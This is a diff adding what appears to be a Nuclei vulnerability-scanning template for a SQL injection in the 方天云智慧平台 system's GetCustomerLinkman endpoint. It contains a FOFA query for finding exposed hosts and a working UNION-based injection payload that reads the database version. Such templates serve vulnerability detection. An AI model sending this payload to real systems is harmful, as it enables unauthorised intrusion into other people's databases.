@@ -1,0 +1,33 @@
+id: fangtianyunzhihui-GetCustomerLinkman-sql
+
+info:
+  name: 方天云智慧平台系统 GetCustomerLinkman SQL注入
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: body="AjaxMethods.asmx/GetCompanyItem"
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        POST /WXAPI.asmx/GetCustomerLinkman HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {clmID:"1 UNION ALL SELECT NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- QurA"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Microsoft SQL'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
